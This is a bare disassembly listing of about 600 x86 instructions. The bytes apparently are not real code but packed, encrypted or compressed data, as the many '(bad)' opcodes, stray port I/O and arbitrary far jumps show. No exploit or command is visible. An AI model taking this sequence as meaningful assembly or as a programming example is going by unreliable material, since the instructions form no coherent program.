  428ceb:	add    DWORD PTR [edi-0x68],edi
  428cee:	es jb  0x428d5f
  428cf1:	dec    ebx
  428cf2:	pop    ebx
  428cf3:	stc    
  428cf4:	(bad)  
  428cf5:	jo     0x428cf7
  428cf7:	sbb    ebp,DWORD PTR [eax+0x2f]
  428cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cfb:	into   
  428cfc:	xor    DWORD PTR [esi],ecx
  428cfe:	mov    dl,0xa
  428d00:	sbb    ecx,ebx
  428d02:	(bad)  
  428d03:	(bad)  
  428d04:	pop    esp
  428d05:	jge    0x428d06
  428d07:	(bad)  
  428d08:	fiadd  DWORD PTR [ebx+0x28bbb484]
  428d0e:	outs   dx,BYTE PTR ds:[esi]
  428d0f:	mov    ch,0x45
  428d11:	mov    edi,0x3417aea9
  428d16:	stos   DWORD PTR es:[edi],eax
  428d17:	lods   al,BYTE PTR ds:[esi]
  428d18:	dec    ebp
  428d19:	add    eax,0x6f8c6d2d
  428d1e:	xchg   ebp,eax
  428d1f:	faddp  st(6),st
  428d21:	push   ebx
  428d22:	(bad)  
  428d23:	outs   dx,BYTE PTR ds:[esi]
  428d24:	mov    ch,0xb6
  428d26:	lds    eax,FWORD PTR [ecx+0x78]
  428d29:	xchg   ecx,eax
  428d2a:	std    
  428d2b:	in     eax,0x69
  428d2d:	xchg   ebp,eax
  428d2e:	enter  0x85d0,0x6
  428d32:	shl    ebx,1
  428d34:	xor    eax,0x4f6f7d6
  428d39:	ins    DWORD PTR es:[edi],dx
  428d3a:	or     ebx,DWORD PTR ds:0xc2880d0d
  428d40:	shl    DWORD PTR [eax-0x4eb27d7f],1
  428d46:	push   edi
  428d47:	jne    0x428d9b
  428d49:	jl     0x428dc0
  428d4b:	push   esp
  428d4c:	push   ss
  428d4d:	fidiv  DWORD PTR [esi-0x55]
  428d50:	adc    dh,BYTE PTR [edx+0x43b9fe33]
  428d56:	or     BYTE PTR [edx],cl
  428d58:	sub    BYTE PTR [eax+edi*4],0xd8
  428d5c:	push   ss
  428d5d:	inc    ebx
  428d5e:	pop    edi
  428d5f:	push   esi
  428d60:	ret    0xb58a
  428d63:	dec    ecx
  428d64:	lods   eax,DWORD PTR ds:[esi]
  428d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d66:	sub    ch,BYTE PTR [esi]
  428d68:	or     eax,0x23b27c0f
  428d6d:	shr    DWORD PTR [eax-0x25],0xb6
  428d71:	lea    edx,[edi]
  428d73:	imul   ebx,DWORD PTR [eax+ebp*2+0x5],0xa8d10f02
  428d7b:	ins    DWORD PTR es:[edi],dx
  428d7c:	test   eax,0xdafc2554
  428d81:	out    0x8c,al
  428d83:	jge    0x428d86
  428d85:	in     eax,0x37
  428d87:	mov    dh,0xa1
  428d89:	add    eax,0xbbc306fb
  428d8e:	add    BYTE PTR [edi-0xe],cl
  428d91:	sbb    dh,BYTE PTR [edi+0x570d2db6]
  428d97:	ror    DWORD PTR ds:[eax],cl
  428d9a:	retf   
  428d9b:	data16 mov bh,0xfc
  428d9e:	push   ss
  428d9f:	push   ss
  428da0:	fisub  DWORD PTR ds:0x357b34bb
  428da6:	push   ss
  428da7:	add    ebx,ebp
  428da9:	out    dx,eax
  428daa:	inc    ebx
  428dab:	sbb    eax,0x7b4d9750
  428db0:	lods   al,BYTE PTR ds:[esi]
  428db1:	or     DWORD PTR [edi-0x25a692b3],edi
  428db7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  428db9:	push   cs
  428dba:	enter  0x8a7,0xaf
  428dbe:	js     0x428d9d
  428dc0:	dec    edx
  428dc1:	rol    DWORD PTR [ebp-0x40],1
  428dc4:	cmp    BYTE PTR [edx+0x68e880ac],bl
  428dca:	imul   ebx,esp,0xffffff96
  428dcd:	cmc    
  428dce:	jns    0x428d92
  428dd0:	jnp    0x428e25
  428dd2:	in     eax,dx
  428dd3:	add    al,dh
  428dd5:	outs   dx,BYTE PTR ds:[esi]
  428dd6:	dec    ebx
  428dd7:	dec    ebx
  428dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dd9:	ja     0x428d9a
  428ddb:	dec    ebp
  428ddc:	cmc    
  428ddd:	sub    dh,BYTE PTR [ebx+0x150d415a]
  428de3:	ins    BYTE PTR es:[edi],dx
  428de4:	test   al,0x3e
  428de6:	xchg   ebp,eax
  428de7:	lahf   
  428de8:	jge    0x428d90
  428dea:	ins    DWORD PTR es:[edi],dx
  428deb:	sub    eax,0xc52f6c2c
  428df0:	mov    BYTE PTR [esi+0x4f],ch
  428df3:	dec    esi
  428df4:	(bad)  
  428df5:	aad    0x68
  428df7:	jns    0x428db4
  428df9:	mov    ah,0x59
  428dfb:	sti    
  428dfc:	pop    esp
  428dfd:	fmul   QWORD PTR [esi-0x4fff8c5f]
  428e03:	and    BYTE PTR [eax+0x380b5456],al
  428e09:	loope  0x428e4b
  428e0b:	mov    ds:0x95cfb5b0,eax
  428e10:	retf   
  428e11:	inc    eax
  428e12:	repnz loop 0x428deb
  428e15:	repnz lods eax,DWORD PTR ds:[esi]
  428e17:	stos   DWORD PTR es:[edi],eax
  428e18:	es jp  0x428e23
  428e1b:	add    BYTE PTR [eax-0x7f],ah
  428e1e:	cmp    cl,BYTE PTR [ecx]
  428e20:	adc    al,0x2c
  428e22:	je     0x428e35
  428e24:	mov    ebx,0x1cdf8d87
  428e29:	jb     0x428ddd
  428e2b:	int3   
  428e2c:	mov    al,0x2d
  428e2e:	ins    DWORD PTR es:[edi],dx
  428e2f:	sub    al,0x76
  428e31:	aaa    
  428e32:	push   ds
  428e33:	pushf  
  428e34:	inc    ecx
  428e35:	jmp    0xabb94272
  428e3a:	adc    eax,0x76d394b4
  428e3f:	mov    al,ds:0x2b896c32
  428e44:	rcl    BYTE PTR [edi+esi*4],0x2c
  428e48:	call   0x10f74cdf
  428e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e4e:	jbe    0x428eb3
  428e50:	jge    0x428e2d
  428e52:	stc    
  428e53:	out    0x56,eax
  428e55:	dec    edx
  428e56:	ficom  DWORD PTR [ecx+0x54]
  428e59:	dec    ebx
  428e5a:	dec    ecx
  428e5b:	jp     0x428e3a
  428e5d:	shl    al,0xdb
  428e60:	xchg   esi,eax
  428e61:	sbb    ch,BYTE PTR [edx]
  428e63:	mov    DWORD PTR [eax+ebx*4+0x25],0x6d8fd883
  428e6b:	pop    ebp
  428e6c:	shr    BYTE PTR [ebp-0x23],1
  428e6f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  428e71:	mov    esi,0xb50b395c
  428e76:	ss pop edx
  428e78:	imul   ebp,DWORD PTR [eax+ebx*2-0x45],0x5d
  428e7d:	(bad)  
  428e7e:	into   
  428e7f:	and    al,0xce
  428e81:	add    eax,0x1171b68
  428e86:	pop    ds
  428e87:	clc    
  428e88:	push   ds
  428e89:	icebp  
  428e8a:	sahf   
  428e8b:	push   ebp
  428e8c:	pop    ebp
  428e8d:	fcomp  DWORD PTR [ebp*2-0x463e8250]
  428e94:	enter  0xb319,0x4a
  428e98:	stos   BYTE PTR es:[edi],al
  428e99:	mov    dh,0x4d
  428e9b:	add    al,0xf7
  428e9d:	sbb    ebp,edi
  428e9f:	push   esi
  428ea0:	push   esi
  428ea1:	inc    eax
  428ea2:	pop    es
  428ea3:	adc    BYTE PTR [ebx-0x1ed24be3],bl
  428ea9:	adc    al,0xa2
  428eab:	jbe    0x428ebd
  428ead:	sar    ah,1
  428eaf:	push   cs
  428eb0:	sub    dl,BYTE PTR [esi-0x4e]
  428eb3:	mov    ch,0x6d
  428eb5:	aaa    
  428eb6:	mov    edx,0xd248a757
  428ebb:	mov    edx,0x6b86bc44
  428ec0:	xchg   edi,eax
  428ec1:	mov    dh,0x76
  428ec3:	mov    eax,ds:0x95782e40
  428ec8:	add    eax,0xf8dd4ed4
  428ecd:	adc    esi,DWORD PTR [ebx+ebp*2+0x6b]
  428ed1:	sbb    esp,DWORD PTR [esi+0x71]
  428ed4:	sub    DWORD PTR [ecx],edx
  428ed6:	fisub  DWORD PTR [esi+0x202ea3a8]
  428edc:	mov    dh,0x1d
  428ede:	mov    ebx,0xeb0802f
  428ee3:	(bad)  
  428ee4:	xor    al,0x41
  428ee6:	fcmovnbe st,st(2)
  428ee8:	sbb    DWORD PTR [ebx],esi
  428eea:	pop    ecx
  428eeb:	or     edx,esp
  428eed:	cdq    
  428eee:	aas    
  428eef:	iret   
  428ef0:	test   DWORD PTR [edx],ebx
  428ef2:	and    ch,BYTE PTR [esi]
  428ef4:	scas   eax,DWORD PTR es:[edi]
  428ef5:	pop    ebp
  428ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ef7:	out    dx,eax
  428ef8:	cli    
  428ef9:	imul   ebp,DWORD PTR [eax+0x3df956e8],0x5a
  428f00:	add    al,bl
  428f02:	fiadd  DWORD PTR [eax-0xa]
  428f05:	rcl    esi,0x40
  428f08:	pop    esp
  428f09:	call   0x16a74395
  428f0e:	mov    bl,0xfa
  428f10:	icebp  
  428f11:	inc    edi
  428f12:	pop    ebx
  428f13:	fcmovnb st,st(6)
  428f15:	(bad)  
  428f16:	stos   BYTE PTR es:[edi],al
  428f17:	jb     0x428f84
  428f19:	imul   eax,edx,0x2a16f883
  428f1f:	or     DWORD PTR [eax+0x58cc1b11],ebp
  428f25:	pop    ecx
  428f26:	adc    eax,0x52ed8db6
  428f2b:	sub    DWORD PTR [ebp-0x3d],edx
  428f2e:	(bad)  
  428f2f:	and    eax,0x5be646fc
  428f34:	ret    0xb6c7
  428f37:	std    
  428f38:	mov    ecx,0x84d71bda
  428f3d:	into   
  428f3e:	cmp    ebx,ebx
  428f40:	popa   
  428f41:	mov    dl,0x60
  428f43:	jmp    0x428f6d
  428f45:	loop   0x428ed2
  428f47:	in     eax,0x5a
  428f49:	lods   al,BYTE PTR ds:[esi]
  428f4a:	and    edx,DWORD PTR [ebp+0x2fb60dc]
  428f50:	pusha  
  428f51:	jnp    0x428f94
  428f53:	adc    dl,BYTE PTR [eax+0x1c]
  428f56:	in     eax,dx
  428f57:	mov    ch,ch
  428f59:	(bad)  
  428f5a:	push   esp
  428f5b:	pop    ebx
  428f5c:	inc    edx
  428f5d:	and    al,ah
  428f5f:	je     0x428fc9
  428f61:	push   ebx
  428f62:	pop    edx
  428f63:	sub    BYTE PTR [esi],dl
  428f65:	mov    edx,0x83316be5
  428f6a:	push   esp
  428f6b:	lea    esi,[edi]
  428f6d:	mov    dh,0xa5
  428f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f70:	bound  esi,QWORD PTR [ebp-0x11]
  428f73:	ss sub al,0x38
  428f76:	sub    eax,0xd50d9707
  428f7b:	mov    dl,0x6d
  428f7d:	pop    esp
  428f7e:	cwde   
  428f7f:	stos   BYTE PTR es:[edi],al
  428f80:	push   edx
  428f81:	mov    bh,0xd7
  428f83:	jmp    0x1cebd275
  428f88:	mov    ebp,0xd16a13e9
  428f8d:	mov    WORD PTR ds:0xc58026c0,cs
  428f93:	aam    0xb1
  428f95:	sahf   
  428f96:	repz aam 0x6d
  428f99:	stos   BYTE PTR es:[edi],al
  428f9a:	cs mov ah,0xfb
  428f9d:	push   ebx
  428f9e:	test   eax,0x4984aeae
  428fa3:	std    
  428fa4:	fwait
  428fa5:	add    bl,al
  428fa7:	push   ecx
  428fa8:	jg     0x428fe7
  428faa:	daa    
  428fab:	stc    
  428fac:	fist   WORD PTR ds:0x401746ed
  428fb2:	adc    ebp,esi
  428fb4:	arpl   WORD PTR [ecx-0x4bab4cfa],bx
  428fba:	stos   DWORD PTR es:[edi],eax
  428fbb:	mov    al,ds:0xea60ee4
  428fc0:	imul   esp,DWORD PTR [ebx+0x3f1bd450],0x5f
  428fc7:	stos   DWORD PTR es:[edi],eax
  428fc8:	dec    eax
  428fc9:	adc    BYTE PTR [eax-0x25],ah
  428fcc:	xchg   esi,eax
  428fcd:	ins    DWORD PTR es:[edi],dx
  428fce:	lahf   
  428fcf:	xchg   ebp,eax
  428fd0:	sbb    ebp,esp
  428fd2:	jecxz  0x428f85
  428fd4:	adc    al,0x78
  428fd6:	sbb    ecx,DWORD PTR [ebx]
  428fd8:	pop    ebx
  428fd9:	test   eax,0x6acf1114
  428fde:	rcl    DWORD PTR [eax-0x7c5c8914],cl
  428fe4:	mov    dl,BYTE PTR [esi-0x3f425bb2]
  428fea:	push   esp
  428feb:	dec    ebp
  428fec:	fdiv   DWORD PTR [esi]
  428fee:	dec    edx
  428fef:	(bad)  [ebp-0x38]
  428ff2:	and    ch,BYTE PTR [esi+0x3]
  428ff5:	jbe    0x429020
  428ff7:	or     BYTE PTR [eax+0x585a5c5f],cl
  428ffd:	sbb    eax,0xbd67f4f2
  429002:	dec    esi
  429003:	mov    dh,0x28
  429005:	or     al,0xd0
  429007:	mov    es,WORD PTR [eax-0x18]
  42900a:	and    bl,ch
  42900c:	mov    bh,0x6d
  42900e:	stos   DWORD PTR es:[edi],eax
  42900f:	fucom  st(3)
  429011:	xchg   ecx,eax
  429012:	pop    ss
  429013:	je     0x428ff1
  429015:	pushf  
  429016:	sub    al,0xc
  429018:	sahf   
  429019:	(bad)  
  42901a:	lock inc ebp
  42901c:	ins    BYTE PTR es:[edi],dx
  42901d:	fild   DWORD PTR [ebx+0x1d]
  429020:	int    0x5c
  429022:	cld    
  429023:	jno    0x42901f
  429025:	sbb    edi,DWORD PTR [esp+esi*4]
  429028:	sub    eax,0xda146696
  42902d:	repnz mov esi,DWORD PTR [edx]
  429030:	call   0xf500:0x96801aaa
  429037:	xchg   edx,eax
  429038:	adc    BYTE PTR [ecx-0x60abbe4f],ah
  42903e:	in     al,dx
  42903f:	mov    al,0x9
  429041:	popf   
  429042:	inc    esi
  429043:	adc    eax,0x5d96717e
  429048:	ins    BYTE PTR es:[edi],dx
  429049:	push   eax
  42904a:	cs inc ebx
  42904c:	(bad)  
  42904d:	fstp   st(0)
  42904f:	or     bl,bl
  429051:	retf   
  429052:	(bad)  
  429053:	adc    ch,bh
  429055:	clc    
  429056:	gs cld 
  429058:	xchg   ebp,eax
  429059:	(bad)  
  42905a:	fisttp QWORD PTR [eax+0x1a154432]
  429060:	shl    DWORD PTR [edx],1
  429062:	ins    DWORD PTR es:[edi],dx
  429063:	push   ebx
  429064:	shr    BYTE PTR [ebp-0x6bbea31d],0xf4
  42906b:	out    dx,eax
  42906c:	mov    edx,0x5b6d6e59
  429071:	or     ebp,DWORD PTR [esi+ecx*1+0x12e61be2]
  429078:	xchg   ecx,eax
  429079:	mov    al,0x85
  42907b:	push   edx
  42907c:	jmp    0x429054
  42907e:	push   ss
  42907f:	inc    ebx
  429080:	xor    eax,0xe6dd177d
  429085:	add    al,0xbf
  429087:	mov    BYTE PTR [esi+0xb],ch
  42908a:	in     eax,dx
  42908b:	fs jne 0x429093
  42908e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42908f:	pop    edi
  429090:	push   0x2ec1aee7
  429095:	test   al,0x39
  429097:	push   eax
  429098:	retf   0xd9fe
  42909b:	ins    DWORD PTR es:[edi],dx
  42909c:	test   DWORD PTR [esi],esp
  42909e:	mov    ds:0x9cd7a0d,al
  4290a3:	or     eax,0x8ec5f1bc
  4290a8:	stos   BYTE PTR es:[edi],al
  4290a9:	xchg   BYTE PTR [edx],ah
  4290ab:	sub    BYTE PTR [ecx],bh
  4290ad:	mov    ds:0x9adde81b,al
  4290b2:	pusha  
  4290b3:	inc    ebx
  4290b4:	mov    ebp,0xc686d986
  4290b9:	and    esi,esp
  4290bb:	imul   esi,DWORD PTR [ebp+esi*1-0x73f44ff0],0xcad4e785
  4290c6:	add    al,0x5d
  4290c8:	sub    BYTE PTR [edi+ebp*4+0xd],dl
  4290cc:	pop    ecx
  4290cd:	push   edx
  4290ce:	or     BYTE PTR [eax+0x337635b1],bh
  4290d4:	xor    DWORD PTR ds:0x46921ec3,0x5d
  4290db:	adc    DWORD PTR [edi+eiz*8+0x1e],ebp
  4290df:	push   edi
  4290e0:	(bad)  
  4290e1:	iret   
  4290e2:	cmp    eax,0xd6e97ca0
  4290e7:	mov    edx,0x7ac8de97
  4290ec:	push   0x0
  4290ee:	inc    edi
  4290ef:	xchg   edi,eax
  4290f0:	or     ecx,DWORD PTR [ebp-0x10e4fca5]
  4290f6:	int3   
  4290f7:	jmp    0x286d:0xb7e67306
  4290fe:	outs   dx,BYTE PTR ds:[esi]
  4290ff:	adc    DWORD PTR [eax+0x2e],ebp
  429102:	push   esp
  429103:	aad    0xd5
  429105:	or     BYTE PTR [ecx+esi*2+0x4a],cl
  429109:	add    eax,0x7c25c2ed
  42910e:	inc    edx
  42910f:	cld    
  429110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429111:	xchg   ebp,eax
  429112:	arpl   bx,bx
  429114:	push   ecx
  429115:	aaa    
  429116:	jmp    DWORD PTR [ebx]
  429118:	xor    bh,ah
  42911a:	in     al,dx
  42911b:	or     ch,BYTE PTR [ebp+0x86c031c]
  429121:	loopne 0x429175
  429123:	adc    BYTE PTR [ebx+0x6e9b0867],0x6e
  42912a:	ins    DWORD PTR es:[edi],dx
  42912b:	or     eax,0x2fc5bc10
  429130:	loop   0x42916c
  429132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429133:	xchg   edi,eax
  429134:	mov    eax,DWORD PTR [ebp+0x10612a2e]
  42913a:	mov    ebx,DWORD PTR [esi-0x22527555]
  429140:	bound  edi,QWORD PTR [eax+0x623f6d3f]
  429146:	loopne 0x4290dd
  429148:	add    BYTE PTR [ecx-0x45d54aef],dh
  42914e:	mov    eax,fs
  429150:	(bad)  
  429151:	cs xor al,0x4c
  429154:	jecxz  0x4290ff
  429156:	cmp    dl,dh
  429158:	inc    ch
  42915a:	sub    eax,0x8da5da5a
  42915f:	lods   al,BYTE PTR es:[esi]
  429161:	imul   edx,ebp,0xffffff82
  429164:	xor    dh,BYTE PTR [ecx]
  429166:	std    
  429167:	sbb    DWORD PTR [eax+0x58],0x6a
  42916b:	mov    bh,0xa0
  42916d:	or     BYTE PTR [esi],dl
  42916f:	push   cs
  429170:	je     0x42917f
  429172:	jo     0x42919e
  429174:	mov    dh,0x75
  429176:	inc    eax
  429177:	pop    esp
  429178:	inc    esi
  429179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42917a:	jmp    0xda0e:0x86e7059
  429181:	es call 0x54d8f54d
  429187:	shr    ch,cl
  429189:	xchg   esi,eax
  42918a:	and    eax,0x7e87a12c
  42918f:	xchg   edi,eax
  429190:	(bad)  
  429191:	nop
  429192:	hlt    
  429193:	enter  0x6842,0x9b
  429197:	addr16 clc 
  429199:	(bad)  [esi]
  42919b:	adc    eax,0x61c10670
  4291a0:	fs in  eax,0x50
  4291a3:	retf   
  4291a4:	jge    0x429146
  4291a6:	inc    DWORD PTR cs:[esi+0x7b]
  4291aa:	xchg   ebx,eax
  4291ab:	mov    BYTE PTR [eax],0x3c
  4291ae:	and    al,BYTE PTR [eax]
  4291b0:	mov    ecx,0x5a1fff1f
  4291b5:	sub    bh,BYTE PTR [edx+0x3c73a810]
  4291bb:	(bad)  
  4291bc:	arpl   WORD PTR [ecx+0xadb6171],dx
  4291c2:	mov    BYTE PTR [ebp+0x62],ah
  4291c5:	dec    edx
  4291c6:	test   eax,0x6ae1a216
  4291cb:	pop    ebx
  4291cc:	fadd   DWORD PTR ds:0x7f7fd457
  4291d2:	sub    ch,bh
  4291d4:	test   eax,0x1adc444d
  4291d9:	adc    dh,ch
  4291db:	dec    ebp
  4291dc:	enter  0xff8a,0x43
  4291e0:	jmp    0x8b76:0x7f0b0ba0
  4291e7:	fsubp  st(0),st
  4291e9:	cli    
  4291ea:	clc    
  4291eb:	sub    al,0x1b
  4291ed:	pop    esp
  4291ee:	fsub   DWORD PTR [edx]
  4291f0:	jle    0x4291f9
  4291f2:	stos   BYTE PTR es:[edi],al
  4291f3:	sub    eax,0xb494c077
  4291f8:	stos   DWORD PTR es:[edi],eax
  4291f9:	fcom   DWORD PTR [ecx]
  4291fb:	jl     0x4291ba
  4291fd:	mov    al,0x3c
  4291ff:	fiadd  DWORD PTR [edx]
  429201:	(bad)  [edx+0x43b81475]
  429207:	repnz sbb edi,DWORD PTR [edx]
  42920a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42920b:	int3   
  42920c:	pop    ebx
  42920d:	sub    BYTE PTR [ebx+ebx*2+0x79],dl
  429211:	and    al,0xc5
  429213:	mov    dl,0x8f
  429215:	add    dh,BYTE PTR ds:[esi-0x2f]
  429219:	ins    DWORD PTR es:[edi],dx
  42921a:	lock jmp 0x3381025f
  429220:	iret   
  429221:	add    ebx,edx
  429223:	sub    BYTE PTR [edx],bh
  429225:	es in  al,0x14
  429228:	jg     0x4291e8
  42922a:	dec    ebx
  42922b:	or     eax,DWORD PTR [ebp+0x6462e0aa]
  429231:	jne    0x429256
  429233:	jnp    0x429285
  429235:	mov    ebx,0xeeda6e02
  42923a:	push   ss
  42923b:	lock arpl WORD PTR [edi+0x7602a68d],si
  429242:	push   eax
  429243:	push   esi
  429244:	aam    0xd6
  429246:	pop    ds
  429247:	add    BYTE PTR [ebx],bl
  429249:	sbb    eax,0x9ec9a5c1
  42924e:	mov    ebx,0x9317918e
  429253:	xor    al,0xdb
  429255:	lods   eax,DWORD PTR ds:[esi]
  429256:	adc    DWORD PTR [ebp+0x4a5a808c],esi
  42925c:	repz cmp DWORD PTR [esi+edi*4+0x44],esi
  429261:	mov    al,0x35
  429263:	adc    al,0x1b
  429265:	lahf   
  429266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429267:	stc    
  429268:	and    eax,0xeab1a160
  42926d:	leave  
  42926e:	cmp    al,0x52
  429270:	mov    esp,0x960a06ca
  429275:	test   DWORD PTR [eax],eax
  429277:	sbb    al,0x3a
  429279:	xor    eax,0xda0a675
  42927e:	mov    ds:0x89fb1a8f,al
  429283:	pusha  
  429284:	pop    ss
  429285:	add    al,0xdb
  429287:	and    edx,DWORD PTR [edx-0x6ecd40e3]
  42928d:	mov    DWORD PTR [edx-0x25dd97a8],0xd877c4ff
  429297:	push   ss
  429298:	xchg   esi,eax
  429299:	fstp   QWORD PTR ds:[esi]
  42929c:	sahf   
  42929d:	adc    DWORD PTR [eax-0x54],esi
  4292a0:	mov    al,0x3c
  4292a2:	stos   BYTE PTR es:[edi],al
  4292a3:	fcom   DWORD PTR [eax+0x5c]
  4292a6:	mov    esi,0x105dd12c
  4292ab:	cmp    al,BYTE PTR [esp+ebx*8+0x36]
  4292af:	sbb    dh,BYTE PTR [ebx+edi*2-0x4158fb85]
  4292b6:	ja     0x429269
  4292b8:	or     DWORD PTR [eax-0x5ecc20e3],0xb67f2cdd
  4292c2:	mov    ds:0x87e7be5a,eax
  4292c7:	add    BYTE PTR [edx+0x72],al
  4292ca:	xor    eax,0xbfccb08e
  4292cf:	or     BYTE PTR [ebx-0x72],0xb6
  4292d3:	fcmovbe st,st(7)
  4292d5:	xchg   edi,eax
  4292d6:	jp     0x4292e6
  4292d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292d9:	(bad)  
  4292da:	push   ecx
  4292db:	mov    bh,0xa6
  4292dd:	jp     0x42928b
  4292df:	sahf   
  4292e0:	mov    ds:0x6b35ccd9,eax
  4292e5:	mov    dl,0xed
  4292e7:	or     al,ah
  4292e9:	jge    0x429277
  4292eb:	ins    DWORD PTR es:[di],dx
  4292ed:	arpl   bp,ax
  4292ef:	sbb    al,0x57
  4292f1:	inc    ebp
  4292f2:	fisttp DWORD PTR [ebp+0x1de5cb60]
  4292f8:	adc    eax,0xabb6c140
  4292fd:	pusha  
  4292fe:	xchg   ecx,eax
  4292ff:	dec    esi
  429300:	std    
  429301:	dec    ebx
  429302:	and    al,0x1d
  429304:	(bad)  
  429305:	imul   eax,DWORD PTR [edx-0x3008fe26],0xffffff91
  42930c:	mov    eax,ds:0xca36e9ce
  429311:	ins    DWORD PTR es:[edi],dx
  429312:	popa   
  429313:	rcl    BYTE PTR [edi+edi*1-0x545f65b6],cl
  42931a:	je     0x4292f2
  42931c:	inc    ecx
  42931d:	jo     0x4292fa
  42931f:	ja     0x4292e1
  429321:	fwait
  429322:	sbb    DWORD PTR [esi],esi
  429324:	sbb    esp,esi
  429326:	ret    0x6500
  429329:	mov    al,ds:0x11377ce8
  42932e:	ins    BYTE PTR es:[edi],dx
  42932f:	add    bh,BYTE PTR [edx+0x4fa664b0]
  429335:	mov    ds:0x476f0620,al
  42933a:	inc    ecx
  42933b:	jno    0x42939e
  42933d:	sub    ebp,DWORD PTR [edx+0x59]
  429340:	sbb    eax,0x2886125
  429345:	call   0x8d7:0x70f0db62
  42934c:	mov    ds:0xec4091af,al
  429351:	sub    al,bl
  429353:	js     0x429307
  429355:	scas   al,BYTE PTR es:[edi]
  429356:	(bad)  
  429357:	ds loop 0x42939c
  42935a:	mov    ebx,0xe23e675
  42935f:	push   esi
  429360:	popa   
  429361:	cwde   
  429362:	jns    0x4293ac
  429364:	add    DWORD PTR ds:0xf3badc2d,edx
  42936a:	pop    ecx
  42936b:	retf   
  42936c:	sub    DWORD PTR [eax-0x2256886c],0xffffff96
  429373:	retf   0xc207
  429376:	xchg   ebp,eax
  429377:	pop    ecx
  429378:	cmp    al,0x8f
  42937a:	outs   dx,BYTE PTR ds:[esi]
  42937b:	fist   DWORD PTR ds:[eax+eax*8+0x6d]
  429380:	pop    eax
  429381:	inc    ecx
  429382:	sub    esp,DWORD PTR [edx-0x36]
  429385:	fs jns 0x429338
  429388:	lods   eax,DWORD PTR ds:[esi]
  429389:	and    ebp,DWORD PTR [eax-0x444afda5]
  42938f:	imul   ebp
  429391:	jno    0x4293ee
  429393:	pop    es
  429394:	aam    0xa5
  429396:	fsubr  DWORD PTR [ecx]
  429398:	adc    BYTE PTR [ebx],0x6
  42939b:	cdq    
  42939c:	pop    edi
  42939d:	out    0x36,al
  42939f:	cmp    cl,BYTE PTR ss:[eax-0x75ff4285]
  4293a6:	(bad)  
  4293a7:	push   ecx
  4293a8:	and    ch,BYTE PTR ds:0x9bdd172a
  4293ae:	into   
  4293af:	inc    ecx
  4293b0:	push   eax
  4293b1:	aam    0x68
  4293b3:	arpl   WORD PTR [ebx-0x2b],ax
  4293b6:	int3   
  4293b7:	call   0x162c:0xb7aff66a
  4293be:	or     ch,BYTE PTR [ebp-0x554d1dd5]
  4293c4:	sbb    eax,0x3a175f22
  4293c9:	and    dl,bl
  4293cb:	jmp    0x31ca90c6
  4293d0:	xchg   edi,eax
  4293d1:	add    DWORD PTR [esp+ebx*2-0x28],0x1a
  4293d6:	sbb    esp,eax
  4293d8:	scas   eax,DWORD PTR es:[edi]
  4293d9:	pop    ebx
  4293da:	xchg   esi,eax
  4293db:	push   cs
  4293dc:	ret    0xb42
  4293df:	sbb    eax,0xb07089b2
  4293e4:	mov    dh,0x1a
  4293e6:	inc    eax
  4293e7:	pop    eax
  4293e8:	call   0x164a760d
  4293ed:	loop   0x429446
  4293ef:	inc    eax
  4293f0:	cmp    DWORD PTR [edx+ebp*1-0x2b1e9ea],edx
  4293f7:	and    ch,BYTE PTR [edx+0x2d2ed597]
  4293fd:	sub    al,0x88
  4293ff:	sub    al,0x13
  429401:	sub    DWORD PTR [eax+0x6c],0x5b88c840
  429408:	pop    ebx
  429409:	mov    eax,0xe2ed0422
  42940e:	test   edx,eax
  429410:	out    dx,eax
  429411:	pop    edi
  429412:	xchg   ebx,eax
  429413:	pop    ebx
  429414:	(bad)  [esi+0x6df2088b]
  42941a:	retf   
  42941b:	adc    DWORD PTR [edx+0x31],ecx
  42941e:	test   edi,ecx
  429420:	or     ebx,DWORD PTR [ebx+0x5d]
  429423:	add    eax,0xd4df903d
  429428:	and    eax,0x6b637b3
  42942d:	mov    al,ds:0xe081442d
  429432:	xchg   esp,eax
  429433:	jb     0x4293d5
  429435:	mov    cs,WORD PTR [ebx]
  429437:	outs   dx,BYTE PTR ds:[esi]
  429438:	dec    ebp
  429439:	add    al,0x4b
  42943b:	retf   
  42943c:	mov    ebp,?
  42943e:	push   edx
  42943f:	pop    eax
  429440:	ss inc ecx
  429442:	jo     0x4293e7
  429444:	(bad)  [ebp+0x58786fbe]
  42944a:	jbe    0x429424
  42944c:	mov    dh,0x3a
  42944e:	cmp    bh,0x38
  429451:	pop    ds
  429452:	sub    DWORD PTR [ebp+0x70],ecx
  429455:	dec    ebx
  429456:	pop    ebp
  429457:	adc    DWORD PTR [ebx+ebx*2+0x2],ebx
  42945b:	push   ecx
  42945c:	mov    ebx,0x157a14fc
  429461:	(bad)  
  429463:	outs   dx,DWORD PTR ds:[esi]
  429464:	fwait
  429465:	loop   0x429453
  429467:	add    dh,dl
  429469:	(bad)  
  42946a:	das    
  42946b:	mov    ds:0xb6dd5586,eax
  429470:	rcr    DWORD PTR [ecx],1
  429472:	xchg   ebx,eax
  429473:	jnp    0x42942f
  429475:	push   eax
  429476:	xchg   ecx,eax
  429477:	cmp    ebp,DWORD PTR [edi+esi*4]
  42947a:	mov    eax,0xfc24d6d
  42947f:	imul   ecx,DWORD PTR [ecx],0x3b
  429482:	sahf   
  429483:	psraw  mm1,QWORD PTR [ebp+0xa361400]
  42948a:	retf   0x17e9
  42948d:	sbb    edi,0x416b74cd
  429493:	sub    al,0x28
  429495:	lods   al,BYTE PTR ds:[esi]
  429496:	(bad)  
  429497:	out    0x76,al
  429499:	das    
  42949a:	outs   dx,BYTE PTR ds:[esi]
  42949b:	in     eax,dx
  42949c:	(bad)  
  42949d:	adc    DWORD PTR [ebx],ebx
